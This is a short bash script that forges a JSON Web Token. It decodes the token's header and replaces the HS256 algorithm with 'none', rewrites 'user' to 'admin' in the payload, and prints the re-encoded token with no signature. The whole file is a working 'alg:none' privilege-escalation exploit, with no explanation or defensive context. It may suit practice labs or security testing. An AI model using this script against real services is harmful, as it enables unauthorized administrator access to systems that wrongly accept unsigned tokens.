#!/bin/bash

if [ $# -eq 0 ] ; then
 echo "USAGE: $0 JavaWebToken"
 exit
fi

jwt=$1

part1=$(echo -n $jwt | cut -f1 -d'.' | base64 -di | sed 's/HS256/none/g'| base64)
part2=$(echo -n $jwt | cut -f2 -d'.' | base64 -di | sed 's/user/admin/g' | base64)

echo ""

echo $part1.$part2. | tr -d ' ='
